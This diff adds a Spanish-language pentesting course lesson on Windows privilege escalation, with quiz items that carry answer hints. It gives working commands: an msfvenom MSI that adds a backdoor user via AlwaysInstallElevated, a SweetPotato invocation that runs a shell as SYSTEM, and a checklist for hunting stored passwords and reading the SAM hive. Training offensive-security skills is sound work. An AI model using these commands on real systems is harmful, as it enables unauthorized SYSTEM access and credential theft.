@@ -1,0 +1,79 @@
+---
+index: 3
+title: "AlwaysInstallElevated, tokens y tu checklist"
+questions:
+  - id: privesc-windows-t03-q01
+    prompt: "¿Qué clave del Registry habilita AlwaysInstallElevated (instalar MSI como SYSTEM)?"
+    hint: "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1"
+    kind: text
+  - id: privesc-windows-t03-q02
+    prompt: "¿Qué ataque explota SeImpersonatePrivilege para robar el token SYSTEM?"
+    hint: "La familia Potato (Juicy/Rogue/Sweet/God)."
+    kind: text
+  - id: privesc-windows-t03-q03
+    prompt: "Un KB crítico falta en un Windows Server 2016. ¿Qué tipo de exploit intentar?"
+    hint: "Kernel exploit (searchsploit windows kernel)."
+    kind: choice
+    options:
+      - id: a
+        label: "Ataque de diccionario"
+      - id: b
+        label: "Kernel exploit ( EternalBlue, etc.)"
+      - id: c
+        label: "Phishing"
+      - id: d
+        label: "Ninguno: es imposible"
+---
+
+## AlwaysInstallElevated: MSI como SYSTEM
+
+Si el admin habilitó esta política, CUALQUIER .msi se instala con privilegios SYSTEM:
+
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: Ambas deben ser 0x1 (1 en DWORD)
+```
+
+Si ambas son 1:
+
+```bash
+# Genera un .msi malicioso con msfvenom
+msfvenom -p windows/adduser USER=hacker PASS=P@ss -f msi -o /tmp/adduser.msi
+# Transfiérelo y:
+msiexec /quiet /qn /i C:\temp\adduser.msi
+```
+
+## Ataques Potato (SeImpersonate)
+
+La familia completa:
+
+| Herramienta | Windows | Mecanismo |
+|---|---|---|
+| Juicy Potato | < Server 2019 | COM + NTLM relay al servicio Update |
+| Rogue Potato | Server 2019+ | Igual pero con remote relay |
+| SweetPotato | Universal | Varias técnicas combinadas |
+| GodPotato | Server 2022+ | Named pipes + PrintSpooler |
+
+```bash
+# SweetPotato (el más versátil en labs):
+sweetpotato.exe -p "C:\temp\shell.exe"    # ejecuta shell.exe como SYSTEM
+```
+
+## Tu checklist final de privesc Windows
+
+```text
+□ whoami /priv → ¿SeImpersonate? → Potato
+□ sudo -l equivalente: accesschk -uwcqv user *
+□ Servicios: rutas sin comillas (wmic service get pathname)
+□ Servicios: binarios escribibles (accesschk -wcvu)
+□ AlwaysInstallElevated: reg query (HKLM + HKCU)
+□ Tareas programadas: schtasks + binarios escribibles
+□ Parches: wmic qfe → ¿falta alguno crítico? → kernel exploit
+□ Credenciales: cmdkey /list, findstr /si password, archivos .env
+□ AutoRun: reg query HKLM\...\Run (¿binarios escribibles?)
+□ SAM/SYSTEM: ¿puedes leer C:\Windows\System32\config\SAM?
+```
+
+Con privesc en ambos sistemas dominado, el siguiente módulo monta el escenario real:
+comprometer un dominio Active Directory completo.
